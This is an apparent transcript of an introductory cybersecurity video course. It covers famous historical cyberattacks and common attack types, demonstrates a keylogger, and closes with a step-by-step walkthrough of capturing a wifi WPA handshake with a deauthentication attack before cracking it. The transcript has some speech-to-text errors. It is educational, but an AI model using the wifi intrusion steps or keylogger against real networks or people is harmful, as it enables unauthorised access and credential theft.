quadruple in the near future
organizations are going to need cyber
security professionals who can prevent
these attacks
a career in the field of cyber security
is lucrative and a very smart decision
for professionals now
so what are you waiting for
get certified with simply learn and
become a cyber security expert let's see
what we have at number 10
from april 27 2007 estonia the european
country faced a series of cyber attacks
that lasted for weeks
this happened when the estonian
government decided to move the bronze
soldier from talon center to a less
prominent military cemetery located on
the city's outskirts
unprecedented levels of internet traffic
took down estonian banks online services
media outlets broadcasters and
government bodies
botnets sent massive waves of spam and
vast amounts of automated online
requests
according to researchers the public
faced ddos attacks there were conflicts
to edit the english language version of
the bronze soldier's wikipedia page as
well
although there is no confirmation russia
is believed to be behind these cyber
attacks that largely crippled the
estonian society let's now move on to
the next attack on december 23 2015
several parts of ukraine witnessed a
power outage and this was not a typical
blackout it was indeed the result of a
cyber attack
information systems of three energy
distribution companies in ukraine were
compromised it is the first known
victorious cyber attack on a power grid
it is said that here hackers sent out
phishing emails to the power companies
30 substations were switched off and
about 230 000 people were left in the
dark for about one to six hours u.s
investigators believed that russia-based
hackers were responsible for this
experts have warned that other countries
could also be vulnerable to such attacks
let's see what we have at number eight
in the year 1999 a cyber attack caused a
21 day shutdown of nasa computers
unbelievable isn't it the hacker was
none other than the then 15 year old
jonathan james he first penetrated us
department of defense divisions
computers and installed a back door on
its servers
this allowed him to intercept more than
a thousand government emails including
the ones containing user names and
passwords
this helped james steal a piece of nasa
software and crack the nasa computers
that support the international space
station which cost the space exploration
agencies forty one thousand dollars as
systems were shut down for three weeks
he was the first person to carry out a
computer hack against the american space
agency let's now move on to the next
attack
in late november 2014 there was a leak
of confidential data from the film
studio of sony pictures
information about sony pictures
employees their emails copies of the
then unreleased sony films future
propositions and other crucial data were
leaked
this cyber attack was carried out by a
hacker group named guardians of peace so
what did the hackers want
well they demanded that sony withdraw
its then upcoming movie the interview
this movie was a comedy story line to
assassinate the north korean leader kim
jong-un sony then decided to cancel the
film's theatrical release due to the
threats at cinema screening the movie it
is indeed hard to trace the roots of a
cyber attack in this case after
evaluation the us intelligence officials
arrived at the theory that the attack
was in a way related to the government
of north korea
however north korea had denied the same
moving on to our number six
in december 2006 tjx the u.s retailer
company identified that 45.6 million
debit and credit card details were
stolen
this happened from one of its systems
over 18 months by an unknown number of
intruders it was one of the first
largest ever cyber attacks involving the
loss of personal data
as a result banks in the affected
regions had to reissue and block
thousands of payment cards a group of
hackers did this albert gonzalez being
the mastermind the group was from miami
the place where the tjx heist was
believed to have originated
reports said that the tjx data breach
occurred because of weak web encryption
at two of its martial stores in miami
next moving on to our top five let us
see what we have at number five
the year 2010 witnessed the discovery of
the deadly computer worm stuxnet
this malware's motive was unlike any
other usual cyber attacks it aimed at
destructing the equipment the computers
controlled
stuxnet came with the deadly purpose of
damaging iran's nuclear infrastructure
it infected more than
000 computers including 14 industrial
sites and a uranium enrichment plant in
iran
stuxnet initially spread via microsoft
windows and targeted siemens industrial
control systems
although it was discovered only in 2010
it is believed to have been silently
sabotaging iran's nuclear facilities
it was one of the first discovered
malware that was capable of hampering
hardware systems it largely damaged the
centrifuge of the iranian reactors this
is believed to be a cyber weapon created
by the u.s and the israeli intelligence
although there is no documented evidence
or acceptance by either of the countries
for the same
moving on to number four in the year
2014 home depot was the victim of one of
the deadliest cyber attacks
56 million payment cards were
compromised along with 53 million
customer email addresses stolen
this security breach happened from april
to september 2014
criminals were believed to have used a
third-party vendor's username and
password to enter the perimeter of home
depot network
the attackers were then able to deploy
custom-built malware on its
self-checkout systems in the us and
canada
moving on to our top three
as you might be aware the playstation
gaming system is one of sony's most
popular products unfortunately in april
2011 sony executives witnessed abnormal
activity on the playstation network this
resulted in the compromise of
approximately 77 million playstation
users accounts and prevented users of
playstation 3 and playstation portable
consoles from accessing this service
this forced sony to turn off the
playstation network on april 20th on may
4th sony confirmed that personally
identifiable information from each of
the 77 million accounts had been exposed
the outage lasted for 23 days sony
released almost daily announcements
concerning the system outage in the end
sony is believed to have invested
approximately 170 million dollars to
improve the network security to
investigate the attack and to cover the
expenses of caring for the consumers
that had been affected let's now move on
to the next attack at number two in may
2017 one of the most dangerous cyber
attacks took place
it was known as the wannacry ransomware
attack caused by the wannacry cryptoworm
the victims were the users that used the
unsupported version of microsoft windows
and those who hadn't installed the new
security update
this did not take place through phishing
like other attacks but through an
exposed vulnerable smb port
the attack originated in asia and then
eventually spread across the globe in a
day more than 200 000 computers were
infected across 150 countries
the wannacry crypto worm locked the
users out of the targeted systems and
encrypted their data the users were
asked for a ransom of 300 to 600 dollars
which had to be paid via bitcoin in
exchange for their data this attack took
a toll on both private and government
organizations it resulted in damages
from hundreds of millions to billions of
dollars
in a matter of few days the emergency
patches released by microsoft halted the
attack
also the discovery of a kill switch
prevented the infected computers from
spreading the crypto worm security
experts and a few countries believed
that north korea was behind this attack
and finally let's see what we have at
number one
more than two decades ago in march 1999
the melissa virus a mass mailing macro
virus was released
it targeted microsoft word and outlook
based systems and created considerable
network traffic
melissa virus infected computers via
emails the email would look like an
important message well yes it was fake
if the recipient opens the attachments
in the mail and downloads the document
and then opens it with microsoft word a
virus was released on their computers
this would then mass mail itself to the
first 50 people in the victims contact
list and then disable multiple safeguard
features on microsoft word and microsoft
outlook this began spreading like a
wildfire across the internet david l
smith released the virus the virus
caused nearly 80 million worth of
damages it did not steal data or money
however it caused a havoc almost 1
million email accounts were disrupted
worldwide agencies were overloaded and
some had to be shut down entirely and
internet traffic in some locations were
slowed down do you agree with our list
if you're aware of any other great
interesting computer hacks in history do
let us know in the comment section below
let's begin with the rise in cyber
crimes so let's talk about wannacry this
is something that happened way back in
2017 let's not say way back it's just
2019 two years back and it took the
world by stop so it was a cyber attack
which encrypted the data of
organizations and then the hackers held
that organization ransom by asking of
rather demanding money from them to
decrypt their own data so what exactly
happened the attack originated in asia
and then spread across the rest of the
world note the date and how did this
happen there was a vulnerability that
was identified in microsoft windows the
smb vulnerability smb which is server
message block is essentially the file
sharing and the printer sharing services
that you use in a lan environment on
windows operating system by default
these are enabled on your desktops and
there is a hardening guide that people
utilize to to either upgrade the version
of smb to a more secure version ordered
a disabled smp and
utilize something else now this was a
known vulnerability and this was
targeted within days more than 230 000
computers when infected across 150
countries now when we say this was
identified microsoft knew of this
vulnerability and in fact they had
released a patch in april of 2017 to
mitigate this vulnerability within two
months of that release this attack had
happened now in a real-world scenario it
is not possible for all the servers and
devices to be upgraded to the latest
patch level because organizations need
to test those patches to see if those
patches are going to interfere with the
services that they are providing and
hence no organization will be completely
patched up at any point in time and this
was the flaw that sadly took down a lot
of organizations the patch was available
but it wasn't testing somewhere not
utilizing it yet and they did not see it
as a high value risk and suddenly
something happened and wannacry took
place now what happened was a crypto
worm called wannacry which basically
encrypts the data and locks the user out
of their own computers and they get a
screen in front of them which says your
data has been encrypted and it gives
them a link and they are they demand 300
to 600
to be paid to the hackers to retrieve
the decryption key for their data now
here obviously you're not going to pay
cash to hackers neither are you going to
make a bank transfer because both of the
ways you can identify the hackers and
then pursue them so the hackers demanded
this exchange via bitcoins
cryptocurrency this is the best way to
remain anonymous and the best way to
make payments over the internet without
being identified so what was the impact
of the attack around two hundred
thousand to three hundred thousand
computers were infected now it sounds
like a small number of computers when we
were talking about global however the
services that it affected were huge in
uk the national health service got
affected all the databases got encrypted
surgeries and treatments of patients
were postponed fedex renault nissan all
of these organizations got compromised
and the production lines basically shut
down for a few days till they retrieved
data from backup started to restore and
then try to bring back everything to
normal then in february 2019 dunkin
donuts announced that the users of their
reward programs were targeted by a
credential surfing attack that means
that the attackers stole the credentials
usernames and passwords of customers of
dunkin donuts now we think dunkin donuts
they sell donuts how much could it
impact anyone but if you have an online
account with dunkin donuts you also have
your personal identifiable information
stored in those accounts for example
your name address credit card
information maybe your social security
number or your national insurance card
or something like that which can lead to
identity theft people can misuse that
information pretend to be you and then
take out loans or do transactions in
your name where you are going to end up
paying those bills so stealing of such
kind of data is going to impact all the
users adversely so the first name last
name and email ids were stolen that is
still good enough to launch social
engineering attacks and target these
victims
to phishing attacks or similar attacks
so now let's look at the different types
of attacks in cyber so we are going to
discuss these six malwares we are going
to talk about social engineering attacks
man-in-the-middle attacks denial of
service sql injections and password
attacks now if you look at this malwares
basically target hosts operating systems
social engineering attacks would address
or attack the gullibility of a human
being with the help of a computer for
example sending a fake mail or hosting a
fake website man in the middle attack
would target a network and then try to
capture data packets within the network
thus compromising your credentials a
denial of service attack would crash a
service sql injection attacks would
attack an application and a password
attack would attack the usernames and
passwords of accounts thus taking
advantage of weak passwords and getting
access to your accounts so let's start
with malware malware basically refers to
malicious software the first part of
malicious mal and the where out of
software becomes malware malwares are
nothing but vehicles in which hackers
embed payloads payloads could be viruses
worms ransomwares trojans so they hide
these kind of malicious softwares within
legitimate looking softwares and they
post them on the internet people who are
interested in those kind of softwares
will obviously download them and since
they are looking very legitimate they
will try to install them thus
accidentally and unknowingly installing
a trojan virus or a ransomware on their
machine now most of us have done this at
one point in time where we have looked
at pirated software because we did not
want to pay for it and then we we
probably go to torrents and then search
for those softwares download them and
there's a keygen.exe over there which we
have to execute and then we have to copy
that code the exe file that comes out or
with the keygen and then we have to
replace it and i mean it's a very
convoluted process but the fact that you
have to restore some code with some
other code would basically mean that
there is something wrong with that file
so 99 percent of the time these programs
would have viruses or trojans embedded
within them and it is going to affect
the security posture of your
computers if you scan keygen.exes with
any antivirus across the globe they will
always report them as malwares and they
will probably want to delete those kind
of files so how do these get infected it
gets infected into a system when the
user clicks on a suspicious link now
obviously if you think it is a
suspicious link you're not going to
click on it but you press the link or
you're compelled to click on it just out
of curiosity let's say you click on that
link there's a redirector it downloads
an attachment from a malicious server
and it gets installed on your machine
most of the common ways a virus or a
worm is spread is through usb devices
people pass around usb devices like
nobody's business and you have no idea
where the device has been used before
and you plug into your machine and if
there is a virus on that usb device it
will get infected on your machine as
well malwares are nothing but malicious
softwares that pose as legitimate
softwares but will have a virus trojan
or a worm embedded within it right it
could also be a keylogger a keylogger is
nothing but another software that is
created to catch all the keystrokes that
the user is making create a copy of it
and store it and send it back to the
hacker so whatever the user is typing it
will now be known to the hacker it could
be bank details passwords any personal
information that the user might want to
keep secret we are going to look at
three different demos here this demo is
just to showcase a couple of things uh
we are going to look at a keylogger how
a keylogger works this virtual machine
here and i have already downloaded a
keylogger and installed it the idea of
this demo is to showcase how a keylogger
functions right so you can see online on
the screen we are using a free
keylogger.en.softtoney.com here on this
site and you can download the free
keylogger right from here what i've done
using my demos is that i've always have
a keylogger running in the background to
capture all the keystrokes that i've
been doing whenever i'm doing any demos
so this keylogger here can actually be
hidden in the taskbar but for our demo
purposes i've kept it visible when you
click on it it will open up and give you
a basic screen where you can start
navigating about the keylogger now you
can see that on 8th which is today it
already shows some keystrokes
applications and some visited websites
as you can see already been browsing
using the browser over here and which
has been recorded by the keylogger in
the background and just to give you an
example if i click on this file you will
see all the keystrokes that i have been
doing so far and you can see i've gone
to this i've opened up my mozilla
firefox i've typed in a search keyword
of free keylogger then i've gone on to
the website how secure is mypassword.net
in which i may have tried out a few
passwords myself and then i've gone and
copy pasted this url into the browser
window and you can see all of this has
been recorded and just to emphasize on
that let's go on to another website and
let's say let's go to facebook.com i'm
not actually going to log in i'm just
going to type in a random username so
someone at simplylearn.com and a
password like asd at the rate one two
three four and i'm going to try to log
in obviously the login is going to fail
because this account doesn't exist but
we want to see what happens in the
background when the keylogger picks up
the keystrokes that we have typed so
let's open up the keylogger again and go
and see what is there in the keystrokes
and clipboard and you can see over here
that we typed in facebook.com enter and
then we did not type in the username
that's the difference here we selected
it from a drop down so a keystroke
logger or keylogger has not been able to
capture that input a keylogger in its
essence is only records something that
has been typed in by the user real time
since we did not type in the username it
did not record that username but we
typed in the password and you can see
the password over here asd at the rate
one two three four and this is how a key
logger works it only captures the key
strokes that have been typed in real
time so if we use this exercise on our
victims and they're just using drop down
menus at that point in time none of the
data is going to be recorded for that
activity you would need something which
is known as spyware which would capture
screens which would capture all of this
information that is going on now apart
from just logging keystrokes what this
software also does is it also has a list
of used applications you can see all the
applications that have uh booted up
along with the operating system and the
ones that have started up after the
operating system has booted it also has
a list of the visited website so you can
see these are the websites that we have
been visiting and uh they have been
listed right here the last one being
facebook login or sign up right so this
can store history for a
really long time if i go back in time
and if i look at some of the demos that
i've been looking at so on 14th of
september these were the keystrokes that
i utilized when i was doing some
trainings or while i was providing some
demos on other topics so a keystroke or
a keylogger will store all that
information and keep on recording it
till you actually delete that data or
you can you can reset the key locker you
can also set up the keylogger to send
the email to you on a daily as a daily
report to a particular email address
that you've sent so as long as it
detects the internet connectivity this
keylogger will send you an email to the
email address that you have specified
with all the keystrokes that it has
locked now this is the free version
there's again a paid version for it so
you can go and visit this site and see
how this key logger functions if i press
on the x button over here it will ask me
if i want this to be hidden in the
system tray if i click on yes it only
using this shortcut will i be able to
invoke this screen so just for demo
purposes i do not want this to be hidden
so i'm going to click on no and you can
see that the keylogger is still visible
over here so that was the first demo
that we are seeing viruses as we all
know are destructive programs that uh
once executed would destroy data or harm
the hard disk or the partition tables
worms on the other hand would be
software's that would be more of a
nuisance value where they're going to
replicate themselves in such a way that
they would consume the resources of a
computer thus crashing the computer and
then requiring a reboot a trojan horse
is another software that will allow a
backdoor entry or a covert channel to
that hacker where the hacker in this
case would then be able to gain access
to the victims machine through the
covert channel or the back door without
the knowledge and the authorization of
the user themselves then let's talk
about social engineering attack now this
is where your people skills come into
the picture this is the art of
manipulating people and convincing them
to give up confidential information
either knowingly or unknowingly so most
likely well uh we trust our friends
right and we talk to them a lot and we
give out some confidential information
which we would not give out to others
what if somebody is pretending to be our
friend just to get this information out
of us and we trust this person to give
out that information and we suddenly get
affected because of that now i'm not
saying that everybody in the world does
that but it is one of the most common
attacks that is experienced in the
computing world now social engineering
attacks can be broken down into three
categories first is a phishing attack
don't worry about that figure over there
you're actually not going to go fishing
it's but basically what known as a
fishing attack then there is a spear
phishing attack and then there's a
veiling attack all of these are types of
social engineering attacks where you of
uh where you're targeting a user by
sending out fake mails or fake websites
and the gullibility into clicking on
those links and then giving out
information so what is a phishing attack
it is a practice wherein a hacker
usually sends fake mails which look
really genuine or hosts fake websites
which also look genuine and looks like
they're from a trusted source once you
click on those links there would be
embedded scripts or embedded malwares
which would then be executed and and
then get installed on your machines
compromising the security of your device
these utilities could be used to steal
credit card information create steal
data from your computer upload data to
your computer use your computer as a bot
and anything and everything that the
hacker might want to do spearfishing is
a variation of fishing now fishing is a
non-targeted attack it is to the whole
world at large whoever becomes a victim
becomes a victim however spear phishing
is a targeted attack it is to a specific
individual or to a group of individuals
in an organization so it becomes a
customized attack you identify the
victim you identify the flaws that are
existing over there in the organization
you identify the gullibility of the
victim create that fake mail to suit
that particular situation
send it across to them they'll click on
that link and get infected by whatever
payloads that you have embedded within
it railing is when you are targeting
particularly wealthy or powerful people
in the industry so normally uh when
you're targeting ceos cfos high level
management people of an organization it
would be known as a veiling attack so
here the example is where the email has
been received your customer your account
is going to expire today to keep your
account activated please click on the
link here and proceed with the
verification process now here the link
that we see activate.com would be a
hyperlink which is going to mask the
actual url with the
link is going to redirect us right here
the attack is on the gullibility of the
customer where they would fear that the
account would be deactivated and to
prevent that they would press this email
click on the link and then provide the
information thinking that they're just
reactivating their account but they're
actually leaking their own information
to the attacker so the first thing you
have to understand is banks or any
organization are no not going to send
you any emails with the link in it
asking you to reactivate or anything
like that in fact banks proactively tell
us that they are not going to give our
callers and ask for any information in
fact they would want us to call them on
their registered number or the helpline
number that they have declared on their
website or on the cards that we possess
then moving on to social engineering
this is something very common in today's
world this is basically where the prey
is the human itself and the reason
social engineering attacks are very
successful is because of the gullibility
factor that a human has for example
human has something called emotions that
a machine wouldn't you could plead with
a human for a password to be reset by
gaining sympathy or empathy but try
doing that with a machine those attacks
are going to fail social engineering
attacks are not only limited to those
but we can talk about phishing phishing
is also a part of social engineering
attack where the gullibility of the user
to click on that link is being exploited
in this scenario here this is clark is
calling from the id security team that
means that he is impersonating probably
and then telling the victim that the
system has been compromised please share
the password with me the victim on the
other hand thinks that the person is
trying to help her
probably doesn't verify that person
trust that person and then provides the
password over the phone now here it is
fear that is being exploited because the
password being compromised would uh
clearly upset the end user for loss of
data or for the computer revealing out
confidential information thus here she's
trusting the itd security team for the
password to be reset and given back to
her then we come to the network attacks
man in the middle this is also known as
eavesdropping attack which literally
means that you are going to listen in on
to somebody's conversation for example
in the figure the client is trying to
talk to the server but you become a man
in the middle and you try to listen in
on the conversation that is going on now
obviously the conversation over here may
not be audio but the data that is being
exchanged between the server and the
client you just listen in you make a
copy of that data and you store it at
your end the data could contain
usernames passwords may contain
confidential information and help you
compromise data the attacking computer
takes the ip address of the client so
you find out the ip address of the
client the client is not aware of about
this the client is trying to communicate
with the server you spoof yourself as a
default gateway or a trusted device and
the client thinks that it is through you
that they need to communicate to the
server and thus they start sending data
via your pc so this attack normally
happens on public wi-fi networks i've
seen that happening a lot and does i
never recommend anyone using those
public wi-fi for example you go to a
coffee shop they have free wi-fi over
there you connect to it and you start
surfing you start browsing you are
always signed into google facebook
accounts your bank accounts and whatnot
and then there's a sniffer there is a
hacker who's doing a man in the middle
attack capturing all that data now it's
not an easy attack but it can be done so
this diagram shows where the man in the
middle attack has become successful and
now that the client and the server both
are sending information via the attacker
without knowing them knowing that the
attacker is capturing all that data so
here in this example uh here suppose
you're in trouble and you need money
right now and you call your friend and
ask for money so here the person is
calling john uh telling john that
they're in trouble and they're asking
for jon to give their credit card number
over the phone now this is a legitimate
transaction the friend is actually
calling john and asking for some help
however when john is providing that help
over the phone with the credit card
numbers maybe the cvv number and all of
that and then the otp at the end of it
at the same time there could be a hacker
doing a man in the middle attack where
they could be eavesdropping on whatever
is being said or whatever data is being
transferred and once they capture this
confidential data they can then misuse
that data to their own gains then comes
the denial of service attack the motive
in a dos attack is not to benefit
monetarily but to bring down a service
for legitimate users that's just causing
harm to the organization for example if
i consume the bandwidth of to a
particular website since there's no more
bandwidth left other legitimate users
who want to interact with the website
will not be able to connect to the
website thus creating a denial of
service to those legitimate users now it
may not be possible for me to use my
laptop to target a cluster of servers
because obviously the bandwidth at the
other end would be very high so i would
distribute my attack across multiple
devices thus creating a distributed
denial of service also called a ddos
attack then we come to the sql injection
or sql sql stands for structured query
language which is the de facto language
that is used by applications to interact
with databases so let it be a microsoft
sql database mysql database oracle sql
the syntax may be a little bit different
but it is still the structured query
language that applications utilize to
interact with the database now the
queries that are created by the
applications need to be sanitized at the
application level itself so developers
need to be very careful of how they are
going to create those queries what
queries are allowed to go to the
database because a database is designed
to answer queries it doesn't know what
is a legitimate query and what is a
illegitimate query if it receives a
query it is going to try to execute it
and give out information thus a hacker
may insert malicious queries or
malformed queries into a sql server
through the vulnerable application
causing a security event so depending on
the queries that have been created the
attacker could delete some data or
modify data add data edit it or do
anything that is manages in nature that
would compromise the integrity and the
security of that database for example
the dunkin donuts right except apart
from being a credential attack since
they got access to the database they
could have added or deleted any
information about any users
that were there so
the next attack would be a password
attack as the name suggests this attack
is used to crack or get the password for
users account or when we say crack
passwords this is basically where
somebody's trying to brute force or
they're trying to guess the password and
they're going to break the password thus
getting access to your accounts there
are five different ways passwords can be
cracked the first one is a dictionary
attack where we use every password that
is possible through the dictionary now
this is the use of an actual dictionary
and that's one of the reasons when we
try to create passwords we are advised
not to create passwords based on
dictionary words because these are
easily guessable and there are lists
already out there that contain all of
these words there's a tool that you can
utilize and that tool will then pass
through each and every word that is in
the dictionary file and then compare it
to a possible password if one of the
words matches the password has then been
compromised so if we are observing a
little bit higher security where we have
created a password that is not based on
the dictionary world then we want to
look at other attacks like brute force
it is a trial and error method so
basically what we do is we identify how
the passwords were created for example
in today's world the policies would be
to consume in a password any any of the
alphabet characters a through z
uppercase or lowercase 0 through 9 and
then special characters and then we want
to randomize the uh usage of these
characters so that they are not easily
guessable but a brute force attack at
the same time would then try every
permutation and combination there is
possible in the entire character set and
then try to figure out the password now
this takes a really long time and does
take a lot of compute and storage power
and that's where the botnet example
comes in comes back in the one that we
saw earlier which was used for dos
attack but similarly if i've
infected multiple computers like this i
can then distribute this attack onto all
those computers and use the entire
compute power that is available to
shorten the time that is required to uh
crack the password now based this is 100
successful given the time that it may
take so if the time that is going to
take is going to be 100 years the attack
becomes unsuccessful because during that
period uh the password is most likely to
be changed the technology is going to be
changed and so on so forth so if the
password is easily guessable this can be
a very easy attack to perform then a key
logger which is a similar attack to what
we have seen so keylogger as discussed
earlier is nothing but a software that
once installed on your machine would
grab each and every key stock that the
user has made and store it in a file
which the hacker can later on access so
whatever you have been typing passwords
credit card information or anything else
all of those would be recorded and
stored in the file and that's one of the
best way a password can be compromised
then shoulder surfing this is a physical
attack rather than being a technical one
uh here you need to be physically
present when the user is typing in their
password and you actually look over
their shoulder to see what they're
typing and try to figure out what the
password is if they're quick typers it
is going to be a little bit more
difficult if they're slow typers it's
going to be that much more easy and the
last one is called a rainbow table now
passwords when applications store them
are stored in hash format hash is
nothing but a one way signature that is
created of the password file of the word
that is used for the password and it is
based on an algorithm so the input could
be a variable length for example a
password could be 7 to 14 characters but
the output of a hash value would be
fixed based on the algorithm that you're
consuming so most common algorithms in
today's world that we utilize are sha
secure hashing algorithms before that we
use md5 or message digest so all of
these convert the passwords from plain
text into a hash value and store it into
a database so if you actually attack
that database to grab a password you're
going to get the hash value not the
password in clear text and thus in that
scenario comes the rainbow table to the
rescue a rainbow table is nothing but a
file that will have a list of all
possible passwords along with their hash
values in the required format so if you
remember the dictionary attack the
dictionary attack was nothing but a list
of words based on the dictionary that
were stored in a file and then the
software was just trying each and every
word against a possible password here we
do not have the word but we have the
hash value so to reverse engineer hash
value what we created is we created a
rainbow table where there would be a
list of the possible passwords and their
corresponding hash values so we then
compare the hash value that we have
captured and then search for that hash
value in the file that we have created
the hash value that matches the
corresponding word to it is the password
in clear text so these are the five
types of password attacks cyber security
has become one of the most rigid
industries in the last decade while
simultaneously being the most challenged
with every aspect of corporate culture
going online and embracing cloud
computing there is a plethora of
critical data circulating through the
internet all worth billions of dollars
to the right person
increasing benefits require more complex
attacks and one of these attacks is a
brute force attack
a brute force or known as brute force
cracking is the cyber attack equivalent
of trying every key on your key ring and
eventually finding the right one
brute force attacks are simple and
reliable there is no prior knowledge
needed about the victim to start an
attack most of the systems falling prey
to brute force attacks are actually well
secured
attackers let a computer do the work
that is trying different combinations of
usernames and passwords until they find
a one that works
due to this repeated trial and error
format the strength of password matters
a great deal
although with enough time and resources
brute force will break a system since
they run multiple combinations until
they find the right passcode
a brute force attack also known as an
exhaustive search is a cryptographic
hack that relies on guessing possible
combinations of targeted password until
the current password is discovered
it can be used to break into online
accounts encrypted documents or even
network peripheral devices
the longer the password the more
combinations that will need to be tested
a brute force attack can be time
consuming and difficult to perform if
methods such as data obfuscation are
used and at times downright impossible
however if the password is weak it could
merely take seconds with hardly any
effort
dictionary attacks are an alternative to
brute force attacks where the attacker
already has a list of user names and
passwords that need to be tested against
the target it doesn't need to create any
other combinations on its own
dictionary attacks are much more
reliable than brute force in a real
world context but the usefulness depends
entirely on the strength of passwords
being used by the general population
there is a three-step process when it
comes to brute forcing a system
let's learn about each of them in detail
in step one we have to settle on a tool
that we are going to use for brute
forcing
there are some popular names on the
market like hashcat
hydra
and john the ripper
while each of them has its own strength
and weaknesses each of them perform well
with the right configuration
all of these tools come pre-installed
with certain linux distributions that
cater to penetration testers and cyber
cybersecurity analysts like kali linux
and parrot security
after deciding what tool to use we can
start generating combinations of
alphanumeric variables whose only
limitation is the number of characters
for example while using hydra a single
6-digit password will create 900 000
passwords with only digits involved
add alphabets and symbols to that sample
space and that numbers grows
exponentially
the popular tools allow customizing this
process
let's say the hacker is aware of the
password being a specific eight-digit
word containing only letters and symbols
this will substantially increase the
chances of being able to guess the right
password since we remove the time taken
to generate the longer ones we omit the
need for including digits in such
combinations
these small tweaks go a long way in
organizing an efficient bruce force
attack since running all the
combinations with no filters will
dramatically reduce the odds of finding
the right credentials in time
in the final step we run these
combinations against the file or service
that is being broken
we can try and break into a specific
encrypted document a social media
account or even devices at home that
connect to the internet let's say there
is a wifi router
the generated passwords are then fed
into the connection one after the other
it is a long and arduous process but the
work is left to the computer other than
someone manually clicking and checking
each of these passcodes
any password that doesn't unlock the
router is discarded and the brute force
tool simply moves on to the next one
this keeps going on until we find the
right combination which unlocks the
router
sometimes reaching the success stage
takes days and weeks which makes it
cumbersome for people with low computing
power at the disposal however the
ability to crack any system in the world
purely due to bad password habits is
very appealing and the general public
tends to stick with simple and easy to
use passwords
now that we have a fair idea about how
brute force works let's see if we can
answer this question
we learned about how complex passwords
are tougher to crack by brute force
among the ones listed on the screens
which one do you believe will take the
longest to be broken when using brute
force tools
leave your answers in the comments
section and we will get back to you with
the correct option next week
let's move on to the harmful effects of
getting a system compromised due to
brute force attacks
a hacked laptop or mobile can have
social media accounts logged in giving
the hackers free access to the victim's
connections
it has been reported on multiple
occasions where compromised facebook
accounts are sending malicious links and
attachments to people on their friends
list
one of the significant reasons for
hacking malware infusion is best done
when spread from multiple devices
similar to distributing spam
this reduces the chance of circling back
the source to single device which
belongs to the hacker
once brute forced a system can spread
malware via email attachments sharing
links file upload via ftp etc
personal information such as credit card
data usage habits private images and
videos are all stored in our systems be
it in plain format or root folders
a compromised laptop means easy access
to these information that can be further
used to impersonate the victim regarding
bank verification among other things
once a system is hacked it can also be
used as a mail server that distributes
spam across lists of victims
since the hacked machines all have
different ip addresses and mac addresses
it becomes challenging to trace the spam
back to the original hacker
with so many harmful implications
arising from a brute force attack it's
imperative that the general public must
be protected against such
let's learn about some of the ways we
can prevent ourselves from becoming a
victim of brute force attacks
using passwords consisting of alphabets
letters and numbers have a much higher
chance of withstanding brute force
attacks thanks to the sheer number of
combinations they can produce
the longer the password the less likely
it is that a hacker will devote the time
and resources to brute force them
having alphanumeric passwords also
allows the user to keep different
passwords for different websites this is
to ensure that if a single account or
password is compromised due to a breach
or a hack the rest of the accounts are
isolated from the incident
two-factor authentication involves
receiving a one-time password on a
trusted device before a new login is
allowed this otb can be obtained either
via email sms or specific 2fa
applications like authy and aegis
email and sms based otps are considered
relatively less secure nowadays due to
the ease with which sim cards can be
duplicated and mailboxes can be hacked
applications that are specifically made
for 2fa cores are much more reliable and
secure
captures are used to stop bots from
running through web pages precisely to
prevent brute forcing through their
website
since brute force tools are automated
forcing the hacker to solve captcha for
every iteration of our password manually
is very challenging
the capture system can filter out these
automated bots that keep refreshing the
page with different credentials thereby
reducing the chances of brute force
considerably
a definite rule that locks the account
being hacked for 30 minutes after a
specific number of attempts is a good
way to prevent brute force attempts
many websites lock account for 30
minutes after three failed password
attempts to secure the account against
any such attack
on an additional note some websites also
send an email instructing the user that
there have been three insecure attempts
to log into the website
let's look at a demonstration of how
brute force attacks work in a real-world
situation
the world has gone wireless with wi-fi
taking the reins in every household it's
natural that the security will always be
up for debate
to further test the security index and
understand brute force attacks we will
attempt to break into the password of a
wi-fi router
for that to happen we first need to
capture a handshake file which is a
connection file from the wifi router to
a connecting device like a mobile or a
laptop
the operating system used for this
process is parrot security a linux
distribution that is catered to
penetration testers all the tools being
used in this demo can easily be found
pre-installed in this operating system
if getting your learning started is half
the battle what if you could do that for
free
visit scale up by simply learn click on
the link in the description to know more
to start our demo we're going to use a
tool called airgarden which is made to
hack into wireless networks specifically
at this point it's going to check for
all the necessary scripts that are
installed in the system
to crack into a wi-fi and to capture the
handshake file you're going to need an
external network card
the significance of the external network
card is a managed mode and a monitor
mode
for now the wlx1 named card is my
external network adapter which i'm going
to select
to be able to capture data over the air
we're going to need to put it in monitor
mode as you can see above it's written
it is in managed mode right now
so we're going to select option two
which is to put the interface in monitor
mode
and its name is now wlan0 monitor
the monitor mode is necessary to capture
data over the air
that is the necessary reason why we need
an external card since a lot of inbuilt
cards that come with the laptops and the
systems they cannot have a monitor mode
installed
once we select the mode we can go into
the fifth which is the handshake tools
menu
in the first step we have to explore for
targets and it is written that monitor
mode is necessary to select a target
so let's explore for targets
and press enter
we have to let this run for about 60
seconds to get a fair idea about the
networks that are currently working in
this locality for example this ess id is
supposed to be the wi-fi name that we
see when connecting to a network jio24
recover me these are all the names that
we see on our mobile when trying to
search for the
this bss id is supposed to be an
identifier somewhat like a mac address
that identifies this network from other
devices
this channels features on one
or two or there are some many channels
that the networks can focus on
this here is supposed to be a client
that is connected to one such network
for example
the station that you can see 5626 this
is supposed to be the mac address of the
device that is connected to a router
this bssid is supposed to be which wi-fi
it is connected to for example 5895 d8
is this one
which is the jio24 router
so we already know which router has a
device connected to it and we can use
our attack to capture this handshake
now that we it has already run for one
minute now that we press ctrl c
we will be asked to select a target
see it has already selected the number
five which is the jio24 router as the
one with clients so it is easy to run an
attack on and it is easy to capture a
handshake for
select network five
and we run a capture handshake
it says we have a valid wpa wpa2 network
target selected and that the script can
continue
now to capture the handshake we have a
couple of attacks a d or a d or air
replay attack
what this attack does is kick the
clients out of the network
in return when they try to reconnect to
the wi-fi as they are configured that
way that when a client is disconnected
it tries to reconnect it immediately it
tries to capture a handshake file which
in turn contains the security key which
is necessary to initiate the handshake
for our demo let's go with the second
option that is the dr air replay
attack select a timeout value let's say
we give it 60 seconds
and we start the script
we can see it capturing data from the
jio24 network and here we go
we have the wpa handshake file
once the handshake file is captured you
can actually close this and here we go
congratulations in order to capturing a
handshake it has verified that a pmk id
from the target network has successfully
been captured
this is the file that is already stored
so dot cap file for the path we can
let's say we can keep it in a desktop
okay we give the path
and the handshape file is generated
we can already see
a target over here same geo24 router
with the bssid
now if we return to its main menu
we already have the handshake file
captured with us
now our job is to brute force into that
handshake capture file
the capture file is often encrypted with
the security key of the wi-fi network if
we know how to decrypt it we will
automatically get the security key
so let's go to the offline wpa wp to
decrypt menu
since we'll be cracking personal
networks we can go with option one
now to run the brute force tool we have
two options either we can go with the
